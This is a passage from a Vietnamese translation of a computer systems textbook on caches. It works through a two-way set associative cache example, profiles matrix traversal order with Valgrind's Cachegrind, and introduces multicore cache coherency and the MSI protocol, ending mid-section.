<p><img src="C11-MemHierarchy/_images/CacheLRU.png" alt="The LRU bit is a one-bit flag that indicates whether the leftmost line of the set was least recently used (LRU = 0) or the rightmost line of the set was least recently used (LRU = 1)." /><br />
<strong>Hình 15.</strong> Cache 2-way set associative, mỗi set lưu 1 bit metadata LRU để hỗ trợ quyết định thay thế dữ liệu...</p>
<blockquote>
<p><strong>Lưu ý:</strong> Việc Hình 15 chọn quy ước “0 nghĩa là bên trái” và “1 nghĩa là bên phải” chỉ là tùy ý. Cách diễn giải bit LRU có thể khác nhau giữa các loại cache. Nếu bạn được yêu cầu làm việc với cache trong một bài tập, đừng mặc định rằng bài tập đó dùng cùng một sơ đồ code hóa LRU như ở đây!</p>
</blockquote>
<h4 id="ví-dụ-về-set-associative-cache"><a class="header" href="#ví-dụ-về-set-associative-cache">Ví dụ về Set Associative Cache</a></h4>
<p>Xét một CPU có các đặc điểm sau:</p>
<ul>
<li>Địa chỉ bộ nhớ 16-bit.</li>
<li>Cache <strong>two-way set associative</strong> với 64 set. Lưu ý: việc thiết kế cache two-way set associative sẽ nhân đôi dung lượng lưu trữ (hai line mỗi set), nên ví dụ này giảm một nửa số set để tổng số line bằng với ví dụ direct-mapped trước đó.</li>
<li>Cache block 32 byte.</li>
<li>Chính sách thay thế cache <strong>LRU</strong> cho biết line bên trái của set là ít được sử dụng gần đây nhất (LRU = 0) hoặc line bên phải là ít được sử dụng gần đây nhất (LRU = 1).</li>
</ul>
<p>Ban đầu, cache trống (tất cả line đều invalid và bit LRU = 0), như minh họa ở <strong>Hình 16</strong>.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample0.png" alt="A cache with sets marked from 0 to 63. Each set has two lines that are both invalid. Each set's LRU bit starts at 0." /><br />
<strong>Hình 16.</strong> Ví dụ cache two-way set associative trống</p>
<p>Giả sử chương trình chạy trên CPU này truy cập các địa chỉ bộ nhớ sau (giống ví dụ direct-mapped):</p>
<ol>
<li>Đọc từ địa chỉ <code>1010000001100100</code></li>
<li>Đọc từ địa chỉ <code>1010000001100111</code></li>
<li>Đọc từ địa chỉ <code>1001000000100000</code></li>
<li>Đọc từ địa chỉ <code>1111000001100101</code></li>
<li>Ghi vào địa chỉ <code>1111000001100000</code></li>
<li>Ghi vào địa chỉ <code>1010000001100100</code></li>
</ol>
<h5 id="chia-nhỏ-địa-chỉ-address-division-1"><a class="header" href="#chia-nhỏ-địa-chỉ-address-division-1">Chia nhỏ địa chỉ (Address Division)</a></h5>
<p>Bắt đầu bằng việc xác định cách chia địa chỉ bộ nhớ thành <em>offset</em>, <em>index</em> và <em>tag</em>. Xét các phần của địa chỉ từ bit bậc thấp đến bit bậc cao (từ phải sang trái):</p>
<ul>
<li><strong>Offset</strong>: Kích thước block 32 byte ⇒ 5 bit ngoài cùng bên phải của địa chỉ (log₂ 32 = 5) là phần offset. 5 bit này cho phép xác định duy nhất bất kỳ byte nào trong block.</li>
<li><strong>Index</strong>: Cache có 64 set ⇒ 6 bit tiếp theo của địa chỉ (log₂ 64 = 6) là phần index. 6 bit này cho phép xác định duy nhất từng set trong cache.</li>
<li><strong>Tag</strong>: Tag gồm tất cả các bit còn lại của địa chỉ không thuộc offset hoặc index. Ở đây, địa chỉ còn lại 5 bit cho tag (16 - (5 + 6) = 5).</li>
</ul>
<p><img src="C11-MemHierarchy/_images/AssocExample1.png" alt="miss, both lines in set 3 are invalid prior to the access. Update LRU bit to 1." /><br />
<strong>Hình 17.</strong> Đọc từ địa chỉ <code>1010000001100100</code>. Cả hai line tại index <code>000011</code> (set 3) đều invalid, nên yêu cầu miss và cache nạp dữ liệu từ bộ nhớ chính. Bit LRU của set là 0, nên cache nạp dữ liệu vào line bên trái và cập nhật bit LRU thành 1.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample2.png" alt="hit, one line in the set is valid and holds a matching tag." /><br />
<strong>Hình 18.</strong> Đọc từ địa chỉ <code>1010000001100111</code>. Line bên trái tại index <code>000011</code> (set 3) có tag khớp, nên yêu cầu hit.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample3.png" alt="miss, both lines in set 1 are invalid prior to the access. Update LRU bit to 1." /><br />
<strong>Hình 19.</strong> Đọc từ địa chỉ <code>1001000000100000</code>. Cả hai line tại index <code>000001</code> (set 1) đều invalid, nên yêu cầu miss và cache nạp dữ liệu từ bộ nhớ chính. Bit LRU của set là 0, nên cache nạp dữ liệu vào line bên trái và cập nhật bit LRU thành 1.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample4.png" alt="miss, one line's tag doesn't match, and the other is invalid. Update LRU bit to 0." /><br />
<strong>Hình 20.</strong> Đọc từ địa chỉ <code>1111000001100101</code>. Tại index <code>000011</code> (set 3), một line có tag không khớp và line còn lại invalid, nên yêu cầu miss. Bit LRU của set là 1, nên cache nạp dữ liệu vào line bên phải và cập nhật bit LRU thành 0.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample5.png" alt="hit, one of the valid lines holds a matching tag. Set the line's dirty bit to 1." /><br />
<strong>Hình 21.</strong> Ghi vào địa chỉ <code>1111000001100000</code>. Line bên phải tại index <code>000011</code> (set 3) hợp lệ và có tag khớp, nên yêu cầu hit. Vì đây là thao tác ghi, cache đặt dirty bit của line này thành 1. Bit LRU giữ nguyên giá trị 0 để chỉ ra rằng line bên trái vẫn là line ít được sử dụng gần đây nhất.</p>
<p><img src="C11-MemHierarchy/_images/AssocExample6.png" alt="hit, one of the valid lines holds a matching tag. Set the line's dirty bit to 1. Update LRU bit to 1." /><br />
<strong>Hình 22.</strong> Ghi vào địa chỉ <code>1010000001100100</code>. Line bên trái tại index <code>000011</code> (set 3) hợp lệ và có tag khớp, nên yêu cầu hit. Vì đây là thao tác ghi, cache đặt dirty bit của line này thành 1. Sau khi truy cập line bên trái, cache cập nhật bit LRU thành 1.</p>
<p>Trong ví dụ này, cùng một chuỗi truy cập bộ nhớ vốn gây ra <strong>hai conflict miss</strong> ở direct-mapped cache thì lại <strong>không gặp conflict</strong> nào khi dùng cache two-way set associative.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="115-phân-tích-cache-và-valgrind"><a class="header" href="#115-phân-tích-cache-và-valgrind">11.5. Phân tích Cache và Valgrind</a></h2>
<p>Vì cache ảnh hưởng đáng kể đến hiệu năng của chương trình, hầu hết các hệ thống đều cung cấp các công cụ profiling để đo lường mức độ sử dụng cache của chương trình.<br />
Một công cụ như vậy là chế độ <code>cachegrind</code> của Valgrind, và phần này sẽ sử dụng nó để đánh giá hiệu năng cache.</p>
<p>Xét chương trình sau, chương trình này tạo ra một ma trận ngẫu nhiên kích thước <em>N</em>×<em>N</em>:</p>
<pre><code class="language-c">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;time.h&gt;

int **genRandomMatrix(int n, int max) {
    int i, j;
    int **mat = malloc(n * sizeof(int *));

    for (i = 0; i &lt; n; i++) {
        mat[i] = malloc(n * sizeof(int));

        for (j = 0; j &lt; n; j++) {
            mat[i][j] = 1 + rand() % max;
        }
    }

    return mat;
}

void free_all(int **mat, int n) {
    int i;

    for (i = 0; i &lt; n; i++) {
        free(mat[i]);
    }

    free(mat);
}

int main(int argc, char **argv) {
    int i, n;
    int **matrix;

    if (argc != 2) {
        fprintf(stderr, &quot;usage: %s &lt;n&gt;\n&quot;, argv[0]);
        fprintf(stderr, &quot;where &lt;n&gt; is the dimension of the matrix\n&quot;);
        return 1;
    }

    n = strtol(argv[1], NULL, 10);
    srand(time(NULL));

    matrix = genRandomMatrix(n, 100);

    free_all(matrix, n);
    return 0;
}
</code></pre>
<p>Ở các phần trước của chương này, chúng ta đã giới thiệu hai hàm để tính giá trị trung bình của tất cả các phần tử trong một ma trận.<br />
Chúng chỉ khác nhau ở cách truy cập chỉ số phần tử trong ma trận:</p>
<pre><code class="language-c">float averageMat_v1(int **mat, int n) {
    int i, j, total = 0;

    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Lưu ý cách truy cập: [i][j]
            total += mat[i][j];
        }
    }

    return (float) total / (n * n);
}
</code></pre>
<pre><code class="language-c">float averageMat_v2(int **mat, int n) {
    int i, j, total = 0;

    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Lưu ý cách truy cập: [j][i]
            total += mat[j][i];
        }
    }

    return (float) total / (n * n);
}
</code></pre>
<p>Phần này sẽ sử dụng công cụ <strong>cache profiling</strong> để định lượng sự khác biệt giữa hai cách tiếp cận này.</p>
<h3 id="1151-phân-tích-lý-thuyết-và-benchmark-ban-đầu"><a class="header" href="#1151-phân-tích-lý-thuyết-và-benchmark-ban-đầu">11.5.1. Phân tích lý thuyết và Benchmark ban đầu</a></h3>
<p>Một phân tích lý thuyết dựa trên tính cục bộ (locality) và hệ thống phân cấp bộ nhớ cho thấy phiên bản đầu tiên có <strong>spatial locality</strong> (tính cục bộ không gian) tốt hơn trên ma trận <code>mat</code>, vì <code>mat</code> được lưu trữ trong bộ nhớ theo <a href="C11-MemHierarchy/../C2-C_depth/arrays.html#_two_dimensional_array_memory_layout">row-major order</a> (theo hàng).</p>
<p>Phiên bản thứ hai có spatial locality kém hơn vì mỗi phần tử trong ma trận được truy cập theo <strong>column-major order</strong> (theo cột).<br />
Hãy nhớ rằng dữ liệu được nạp vào cache theo <em>block</em>.<br />
Việc duyệt ma trận theo column-major order có khả năng dẫn đến nhiều <strong>cache miss</strong> hơn, từ đó làm giảm hiệu năng.</p>
<p>Chúng ta sẽ chỉnh sửa hàm <code>main</code> để thêm lời gọi hàm <code>gettimeofday</code> nhằm đo lường chính xác sự khác biệt về hiệu năng giữa hai phiên bản.</p>
<pre><code class="language-c">int main(int argc, char** argv) {
   /* Validate command line parameters. */
   if (argc != 2) {
       fprintf(stderr, &quot;usage: %s &lt;n&gt;\n&quot;, argv[0]);
       fprintf(stderr, &quot;where &lt;n&gt; is the dimension of the matrix\n&quot;);
       return 1;
   }

   /* Declare and initialize variables. */
   int i;
   float res;
   double timer;
   int n = strtol(argv[1], NULL, 10);
   srand(time(NULL));
   struct timeval tstart, tend;
   int ** matrix = genRandomMatrix(n, 100);

   /* Time version 1. */
   gettimeofday(&amp;tstart, NULL);
   res = averageMat_v1(matrix, n);
   gettimeofday(&amp;tend, NULL);
   timer = tend.tv_sec - tstart.tv_sec + (tend.tv_usec - tstart.tv_usec)/1.e6;
   printf(&quot;v1 average is: %.2f; time is %g\n&quot;, res, timer);

   /* Time version 2. */
   gettimeofday(&amp;tstart, NULL);
   res = averageMat_v2(matrix, n);
   gettimeofday(&amp;tend, NULL);
   timer = tend.tv_sec - tstart.tv_sec + (tend.tv_usec - tstart.tv_usec)/1.e6;
   printf(&quot;v2 average is: %.2f; time is %g\n&quot;, res, timer);

   /* Clean up. */
   free_all(matrix, n);
   return 0;
}
</code></pre>
<p>Biên dịch chương trình và chạy sẽ cho kết quả sau (lưu ý: thời gian sẽ thay đổi tùy vào máy chạy):</p>
<pre><code>$ gcc -o cachex cachex.c
$ ./cachex 5000
v1 average is: 50.49; time is 0.053641
v2 average is: 50.49; time is 0.247644
</code></pre>
<p>Đó là một sự khác biệt lớn! Thực tế, cách duyệt <strong>row-major order</strong> nhanh hơn cách thứ hai tới <strong>4,61 lần</strong>.</p>
<h3 id="1152-phân-tích-cache-trong-thực-tế-cachegrind"><a class="header" href="#1152-phân-tích-cache-trong-thực-tế-cachegrind">11.5.2. Phân tích cache trong thực tế: Cachegrind</a></h3>
<p>Phân tích lý thuyết hai giải pháp và chạy thử xác nhận rằng phiên bản đầu tiên nhanh hơn phiên bản thứ hai.<br />
Tuy nhiên, điều này chưa xác nhận chi tiết phân tích cache.<br />
May mắn là bộ công cụ Valgrind có thể giúp.<br />
Ở phần trước, chúng ta đã nói về cách Valgrind giúp <a href="C11-MemHierarchy/../C3-C_debug/valgrind.html#_debugging_memory_with_valgrind">tìm memory leak</a> trong chương trình.<br />
Phần này sẽ giới thiệu <strong>Cachegrind</strong>, trình mô phỏng cache của Valgrind.<br />
Cachegrind cho phép lập trình viên nghiên cứu cách một chương trình hoặc một hàm cụ thể tác động đến cache.</p>
<p>Cachegrind mô phỏng cách chương trình tương tác với hệ thống phân cấp cache của máy tính.<br />
Trong nhiều trường hợp, Cachegrind có thể tự động phát hiện cấu trúc cache của máy.<br />
Nếu không, Cachegrind vẫn mô phỏng <strong>L1 cache</strong> (cấp 1) và <strong>LL cache</strong> (last level – cấp cuối).<br />
Nó giả định L1 cache có hai thành phần độc lập: <strong>instruction cache</strong> và <strong>data cache</strong>.<br />
Lý do là LL cache có ảnh hưởng quan trọng nhất đến thời gian chạy, còn L1 cache có mức độ kết hợp (associativity) thấp nhất, nên cần đảm bảo chương trình tương tác tốt với nó.<br />
Những giả định này phù hợp với cấu trúc của hầu hết các máy hiện đại.</p>
<p>Cachegrind thu thập và xuất ra các thông tin sau:</p>
<ul>
<li>Instruction cache reads (<code>Ir</code>)</li>
<li>L1 instruction cache read misses (<code>I1mr</code>) và LL cache instruction read misses (<code>ILmr</code>)</li>
<li>Data cache reads (<code>Dr</code>)</li>
<li>D1 cache read misses (<code>D1mr</code>) và LL cache data misses (<code>DLmr</code>)</li>
<li>Data cache writes (<code>Dw</code>)</li>
<li>D1 cache write misses (<code>D1mw</code>) và LL cache data write misses (<code>DLmw</code>)</li>
</ul>
<p>Lưu ý: Tổng số truy cập D1 được tính bằng <code>D1 = D1mr + D1mw</code> và tổng số truy cập LL được tính bằng <code>ILmr + DLmr + DLmw</code>.</p>
<p>Hãy xem phiên bản 1 của chương trình hoạt động thế nào dưới Cachegrind.<br />
Chạy Valgrind trên code đã biên dịch với lệnh:</p>
<pre><code>$ valgrind --tool=cachegrind --cache-sim=yes ./cachex 1000
</code></pre>
<p>Trong lệnh này, công cụ <code>cachegrind</code> của Valgrind đóng vai trò như một lớp bao quanh file thực thi <code>cachex</code>.<br />
Chọn kích thước ma trận nhỏ hơn giúp Cachegrind chạy nhanh hơn.<br />
Cachegrind sẽ xuất thông tin về số lượng cache hit và miss trong toàn bộ chương trình:</p>
<pre><code>==28657== Cachegrind, a cache and branch-prediction profiler
==28657== Copyright (C) 2002-2017, and GNU GPL'd by Nicholas Nethercote et al.
==28657== Using Valgrind-3.18.1 and LibVEX; rerun with -h for copyright info
==28657== Command: ./cachex 1000
==28657==
--28657-- warning: L3 cache found, using its data for the LL simulation.
average is: 50.49; time is 0.080304
average is: 50.49; time is 0.09733
==28657==
==28657== I   refs:      122,626,329
==28657== I1  misses:          1,070
==28657== LLi misses:          1,053
==28657== I1  miss rate:        0.00%
==28657== LLi miss rate:        0.00%
==28657==
==28657== D   refs:       75,292,076  (56,205,598 rd   + 19,086,478 wr)
==28657== D1  misses:      1,192,118  ( 1,129,099 rd   +     63,019 wr)
==28657== LLd misses:         64,399  (     1,543 rd   +     62,856 wr)
==28657== D1  miss rate:         1.6% (       2.0%     +        0.3%  )
==28657== LLd miss rate:         0.1% (       0.0%     +        0.3%  )
==28657==
==28657== LL refs:         1,193,188  ( 1,130,169 rd   +     63,019 wr)
==28657== LL misses:          65,452  (     2,596 rd   +     62,856 wr)
==28657== LL miss rate:          0.0% (       0.0%     +        0.3%  )
</code></pre>
<p>Tuy nhiên, ở đây chúng ta quan tâm <strong>cụ thể</strong> đến số hit và miss của hai phiên bản hàm tính trung bình.<br />
Để xem thông tin này, dùng công cụ <code>cg_annotate</code> của Cachegrind.<br />
Khi chạy Cachegrind, nó sẽ tạo ra một file trong thư mục hiện tại, có dạng <code>cachegrind.out.n</code> (trong đó <code>n</code> là PID).<br />
Chạy <code>cg_annotate</code> với lệnh (thay <code>cachegrind.out.28657</code> bằng tên file thực tế):</p>
<pre><code>$ cg_annotate cachegrind.out.28657

I1 cache:         32768 B, 64 B, 8-way associative
D1 cache:         32768 B, 64 B, 8-way associative
LL cache:         8388608 B, 64 B, 16-way associative
Command:          ./cachex 1000
Data file:        cachegrind.out.28657
Events recorded:  Ir I1mr ILmr Dr D1mr DLmr Dw D1mw DLmw
Events shown:     Ir I1mr ILmr Dr D1mr DLmr Dw D1mw DLmw
Event sort order: Ir I1mr ILmr Dr D1mr DLmr Dw D1mw DLmw
Thresholds:       0.1 100 100 100 100 100 100 100 100
Include dirs:
User annotated:
Auto-annotation:  off

 ----------------------------------------------------------------------------
         Ir  I1mr  ILmr         Dr      D1mr  DLmr         Dw   D1mw   DLmw
 ----------------------------------------------------------------------------
122,626,329 1,070 1,053 56,205,598 1,129,099 1,543 19,086,478 63,019 62,856  PROGRAM TOTALS

 ----------------------------------------------------------------------------
        Ir I1mr ILmr         Dr      D1mr DLmr        Dw   D1mw   DLmw  file:function
 ----------------------------------------------------------------------------
14,009,017    3    3  9,005,008    62,688    0     1,004      0      0  averageMat_v1
14,009,017    0    0  9,005,008 1,062,996    0     1,004      0      0  averageMat_v2
</code></pre>
<p>Chúng tôi đã chỉnh sửa đầu ra để tập trung vào hai phiên bản hàm tính trung bình.<br />
Kết quả cho thấy <strong>phiên bản 2</strong> có <strong>1.062.996</strong> data miss, so với chỉ <strong>62.688</strong> miss ở <strong>phiên bản 1</strong>.<br />
Cachegrind đã cung cấp bằng chứng rõ ràng rằng phân tích của chúng ta là chính xác.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="116-nhìn-về-phía-trước-caching-trên-bộ-xử-lý-đa-nhân-multicore-processors"><a class="header" href="#116-nhìn-về-phía-trước-caching-trên-bộ-xử-lý-đa-nhân-multicore-processors">11.6. Nhìn về phía trước: Caching trên bộ xử lý đa nhân (multicore processors)</a></h2>
<p>Cho đến giờ, phần thảo luận của chúng ta về caching mới chỉ tập trung vào một cấp bộ nhớ cache duy nhất trên bộ xử lý đơn nhân (single-core processor). Tuy nhiên, các bộ xử lý hiện đại là <strong>multicore</strong> (đa nhân) với nhiều cấp bộ nhớ cache. Thông thường, mỗi <strong>core</strong> duy trì bộ nhớ cache riêng ở cấp cao nhất trong <strong>memory hierarchy</strong> (hệ phân cấp bộ nhớ) và chia sẻ một bộ nhớ cache chung với tất cả các core ở các cấp thấp hơn. Hình 1 minh họa ví dụ về hệ phân cấp bộ nhớ trên một bộ xử lý bốn nhân, trong đó mỗi core có một <strong>L1 cache</strong> riêng, và <strong>L2 cache</strong> được chia sẻ bởi cả bốn core.</p>
<p><img src="C11-MemHierarchy/_images/MulticoreCache.png" alt="An example four-core processor system where each core has its own L1 cache, and all cores share a single L2 cache, with shared RAM underneath." /></p>
<p><strong>Hình 1.</strong> Ví dụ về hệ phân cấp bộ nhớ trên một bộ xử lý đa nhân. Mỗi core trong bốn core có một <strong>L1 cache</strong> riêng, và cả bốn core chia sẻ một <strong>L2 cache</strong> duy nhất, truy cập thông qua một <strong>shared bus</strong> (bus chia sẻ). Bộ xử lý đa nhân kết nối tới <strong>RAM</strong> thông qua <strong>memory bus</strong>.</p>
<p>Hãy nhớ rằng các cấp cao hơn trong <strong>memory hierarchy</strong> có tốc độ truy cập nhanh hơn và dung lượng nhỏ hơn so với các cấp thấp hơn. Do đó, <strong>L1 cache</strong> nhỏ hơn và nhanh hơn <strong>L2 cache</strong>, và <strong>L2 cache</strong> lại nhỏ hơn và nhanh hơn <strong>RAM</strong>. Ngoài ra, bộ nhớ cache lưu trữ một bản sao của giá trị từ cấp thấp hơn trong hệ phân cấp bộ nhớ; giá trị trong <strong>L1 cache</strong> là bản sao của giá trị trong <strong>L2 cache</strong>, và <strong>L2 cache</strong> lại là bản sao của giá trị trong <strong>RAM</strong>. Vì vậy, các cấp cao hơn trong hệ phân cấp bộ nhớ đóng vai trò là cache cho các cấp thấp hơn. Trong ví dụ ở Hình 1, <strong>L2 cache</strong> là cache của nội dung <strong>RAM</strong>, và <strong>L1 cache</strong> của mỗi core là cache của nội dung <strong>L2 cache</strong>.</p>
<p>Mỗi core trong bộ xử lý đa nhân đồng thời thực thi một luồng lệnh (instruction stream) độc lập, thường đến từ các chương trình khác nhau. Việc cung cấp cho mỗi core một <strong>L1 cache</strong> riêng cho phép core đó lưu trữ các bản sao dữ liệu và lệnh chỉ từ luồng lệnh mà nó đang thực thi, trong bộ nhớ cache nhanh nhất của nó. Nói cách khác, <strong>L1 cache</strong> của mỗi core chỉ lưu các khối bộ nhớ thuộc luồng thực thi của nó, thay vì phải cạnh tranh không gian trong một <strong>L1 cache</strong> chung cho tất cả các core. Thiết kế này giúp tăng <strong>hit rate</strong> (tỉ lệ truy cập trúng) trong <strong>L1 cache</strong> riêng của mỗi core so với trường hợp tất cả các core chia sẻ một <strong>L1 cache</strong> duy nhất.</p>
<p>Các bộ xử lý ngày nay thường có nhiều hơn hai cấp cache. Ba cấp là phổ biến trong các hệ thống desktop, với cấp cao nhất (<strong>L1</strong>) thường được tách thành hai <strong>L1 cache</strong> riêng: một cho lệnh chương trình (<strong>instruction cache</strong>) và một cho dữ liệu chương trình (<strong>data cache</strong>). Các cache ở cấp thấp hơn thường là <strong>unified caches</strong> (cache hợp nhất), nghĩa là lưu trữ cả dữ liệu và lệnh chương trình. Mỗi core thường duy trì một <strong>L1 cache</strong> riêng và chia sẻ một <strong>L3 cache</strong> chung với tất cả các core. Lớp <strong>L2 cache</strong>, nằm giữa <strong>L1 cache</strong> riêng của mỗi core và <strong>L3 cache</strong> chung, có sự khác biệt đáng kể trong các thiết kế CPU hiện đại: <strong>L2 cache</strong> có thể là riêng cho từng core, có thể được chia sẻ bởi tất cả các core, hoặc là dạng lai (hybrid) với nhiều <strong>L2 cache</strong>, mỗi cái được chia sẻ bởi một nhóm core.</p>
<blockquote>
<p><strong>Thông tin về Processor và Cache trên hệ thống Linux</strong></p>
<p>Nếu bạn tò mò về thiết kế CPU của mình, có nhiều cách để lấy thông tin về bộ xử lý và tổ chức cache trên hệ thống. Ví dụ, lệnh <code>lscpu</code> hiển thị thông tin về bộ xử lý, bao gồm số lượng core và các cấp, kích thước của cache:</p>
<pre><code>$ lscpu
...
CPU(s):                          12
Thread(s) per core:              2
Core(s) per socket:              6
Socket(s):                       1
...
L1d cache:                       192 KiB
L1i cache:                       384 KiB
L2 cache:                        3 MiB
L3 cache:                        16 MiB
</code></pre>
<p>Kết quả này cho thấy có tổng cộng 6 core (số <code>Socket(s)</code> nhân với <code>Core(s) per socket</code>), và mỗi core hỗ trợ <strong>hyperthreading</strong> hai luồng (<code>Thread(s) per core</code>), khiến 6 core vật lý xuất hiện như 12 CPU đối với hệ điều hành (xem <a href="C11-MemHierarchy/../C5-Arch/modern.html#_multicore_and_hardware_multithreading">Chương 5.9.2</a> để biết thêm về <strong>hardware multithreading</strong>). Ngoài ra, kết quả cho thấy có ba cấp cache (<code>L1</code>, <code>L2</code>, và <code>L3</code>), và có hai <strong>L1 cache</strong> riêng biệt: một cho dữ liệu (<code>L1d</code>) và một cho lệnh (<code>L1i</code>).</p>
<p>Ngoài <code>lscpu</code>, các tệp trong <strong>/proc</strong> và <strong>/sys</strong> cũng chứa thông tin về bộ xử lý. Ví dụ, lệnh <code>cat /proc/cpuinfo</code> xuất thông tin về CPU, và lệnh sau liệt kê thông tin về cache của một core cụ thể (lưu ý rằng các thư mục này được đặt tên theo CPU logic của core hỗ trợ hyperthreading; trong ví dụ này <code>cpu0</code> và <code>cpu6</code> là hai CPU logic của core 0):</p>
<pre><code>$ ls /sys/devices/system/cpu/cpu0/cache
index0/  index1/  index2/  index3/
</code></pre>
<p>Kết quả này cho thấy core 0 có bốn cache (<code>index0</code> đến <code>index3</code>). Để xem chi tiết từng cache, ta đọc các tệp <code>type</code>, <code>level</code>, và <code>shared_cpu_list</code> trong mỗi thư mục index:</p>
<pre><code>$ cat /sys/devices/system/cpu/cpu0/cache/index*/type
Data
Instruction
Unified
Unified
$ cat /sys/devices/system/cpu/cpu0/cache/index*/level
1
1
2
3
$ cat /sys/devices/system/cpu/cpu0/cache/index*/shared_cpu_list
0,6
0,6
0,6
0-11
</code></pre>
<p>Kết quả <code>type</code> cho thấy core 0 có cache dữ liệu và cache lệnh riêng, cùng với hai cache hợp nhất khác. Kết hợp với <code>level</code>, ta thấy cache dữ liệu và cache lệnh đều là <strong>L1 cache</strong>, trong khi hai cache hợp nhất là <strong>L2</strong> và <strong>L3</strong>. Thông tin <code>shared_cpu_list</code> cho thấy <strong>L1</strong> và <strong>L2 cache</strong> là riêng cho core 0 (chỉ chia sẻ giữa CPU <code>0</code> và <code>6</code> — hai luồng hyperthread của core 0), còn <strong>L3 cache</strong> được chia sẻ bởi tất cả 6 core (tất cả 12 CPU logic, <code>0-11</code>).</p>
</blockquote>
<h3 id="1161-cache-coherency-tính-nhất-quán-của-cache"><a class="header" href="#1161-cache-coherency-tính-nhất-quán-của-cache">11.6.1. Cache Coherency (Tính nhất quán của cache)</a></h3>
<p>Vì các chương trình thường có <strong>locality of reference</strong> (tính cục bộ truy cập) cao, nên việc mỗi core có <strong>L1 cache</strong> riêng để lưu trữ bản sao dữ liệu và lệnh từ luồng lệnh mà nó thực thi là rất có lợi. Tuy nhiên, nhiều <strong>L1 cache</strong> có thể dẫn đến vấn đề <strong>cache coherency</strong> (tính nhất quán của cache). Vấn đề này xảy ra khi giá trị của một bản sao khối bộ nhớ trong <strong>L1 cache</strong> của một core khác với giá trị của bản sao cùng khối đó trong <strong>L1 cache</strong> của core khác. Tình huống này xuất hiện khi một core ghi dữ liệu vào một khối đang được cache trong <strong>L1 cache</strong> của nó, và khối đó cũng đang được cache trong <strong>L1 cache</strong> của core khác. Vì mỗi khối cache chỉ là bản sao của nội dung bộ nhớ, hệ thống cần duy trì một giá trị thống nhất cho nội dung bộ nhớ trên tất cả các bản sao của khối cache đó.</p>
<p>Các bộ xử lý đa nhân triển khai <strong>cache-coherence protocol</strong> (giao thức duy trì tính nhất quán cache) để đảm bảo một cái nhìn nhất quán về bộ nhớ, có thể được cache và truy cập bởi nhiều core. Một <strong>cache-coherence protocol</strong> đảm bảo rằng bất kỳ core nào truy cập một vị trí bộ nhớ đều nhìn thấy giá trị mới nhất đã được sửa đổi của vị trí đó, thay vì nhìn thấy một bản sao cũ (stale) có thể đang được lưu trong <strong>L1 cache</strong> của nó.</p>
<h3 id="1162-giao-thức-msi-msi-protocol"><a class="header" href="#1162-giao-thức-msi-msi-protocol">11.6.2. Giao thức MSI (MSI Protocol)</a></h3>
<p>Có nhiều <strong>cache coherency protocol</strong> (giao thức duy trì tính nhất quán cache) khác nhau. Ở đây, chúng ta sẽ tìm hiểu chi tiết một ví dụ: <strong>MSI protocol</strong> (Modified, Shared, Invalid). <strong>MSI protocol</strong> thêm ba <strong>flag</strong> (hoặc bit) vào mỗi <strong>cache line</strong>. Giá trị của một flag có thể là <strong>clear</strong> (0) hoặc <strong>set</strong> (1). Ba flag này code hóa trạng thái của <strong>data block</strong> (khối dữ liệu) liên quan đến tính nhất quán cache với các bản sao khác của cùng khối dữ liệu, và giá trị của chúng sẽ kích hoạt các hành động duy trì tính nhất quán khi có truy cập đọc hoặc ghi vào khối dữ liệu trong cache line. Ba flag được sử dụng trong <strong>MSI protocol</strong> gồm:</p>
<ul>
<li><strong>M</strong> flag: nếu được set, cho biết khối dữ liệu đã bị <strong>modified</strong> (sửa đổi), nghĩa là core này đã ghi vào bản sao giá trị được cache.</li>
<li><strong>S</strong> flag: nếu được set, cho biết khối dữ liệu chưa bị sửa đổi và có thể <strong>safely shared</strong> (chia sẻ an toàn), nghĩa là nhiều <strong>L1 cache</strong> có thể lưu bản sao của khối và đọc từ bản sao đó.</li>
<li><strong>I</strong> flag: nếu được set, cho biết khối dữ liệu trong cache là <strong>invalid</strong> (không hợp lệ) hoặc chứa dữ liệu <strong>stale</strong> (lỗi thời — bản sao cũ không phản ánh giá trị hiện tại của khối dữ liệu trong bộ nhớ).</li>
</ul>
<p><strong>MSI protocol</strong> được kích hoạt khi có truy cập đọc hoặc ghi vào các mục trong cache.</p>
<h4 id="khi-truy-cập-đọc-read-access"><a class="header" href="#khi-truy-cập-đọc-read-access">Khi truy cập đọc (read access):</a></h4>
<ul>
<li>
<p>Nếu cache block đang ở trạng thái <strong>M</strong> hoặc <strong>S</strong>, giá trị trong cache được dùng để đáp ứng yêu cầu đọc (bản sao này chứa giá trị mới nhất của khối dữ liệu trong bộ nhớ).</p>
</li>
<li>
<p>Nếu cache block đang ở trạng thái <strong>I</strong>, bản sao trong cache đã lỗi thời so với phiên bản mới hơn của khối dữ liệu, và giá trị mới cần được nạp vào cache line trước khi có thể thực hiện đọc.</p>
<p>Nếu <strong>L1 cache</strong> của core khác đang lưu giá trị mới (với <strong>M flag</strong> được set, nghĩa là nó lưu bản sao đã được sửa đổi), core đó phải <strong>write-back</strong> (ghi ngược) giá trị của mình xuống cấp thấp hơn (ví dụ: <strong>L2 cache</strong>). Sau khi ghi ngược, nó <strong>clear</strong> M flag (bản sao của nó và bản sao ở cấp thấp hơn giờ đã nhất quán) và <strong>set</strong> S flag để cho biết khối dữ liệu trong cache line này có thể được cache an toàn bởi các core khác (L1 block nhất quán với bản sao trong L2 cache và core đọc giá trị hiện tại từ bản sao L1 này).</p>
<p>Core khởi tạo truy cập đọc trên một cache line có <strong>I flag</strong> được set sẽ nạp giá trị mới của khối dữ liệu vào cache line của mình. Nó <strong>clear</strong> I flag (khối dữ liệu giờ hợp lệ), lưu giá trị mới, <strong>set</strong> S flag (khối có thể chia sẻ an toàn, nhất quán với các bản sao khác), và <strong>clear</strong> M flag (giá trị trong L1 block khớp với bản sao trong L2 cache — đọc không làm thay đổi bản sao trong L1).</p>
</li>
</ul>
<h4 id="khi-truy-cập-ghi-write-access"><a class="header" href="#khi-truy-cập-ghi-write-access">Khi truy cập ghi (write access):</a></h4>
<ul>
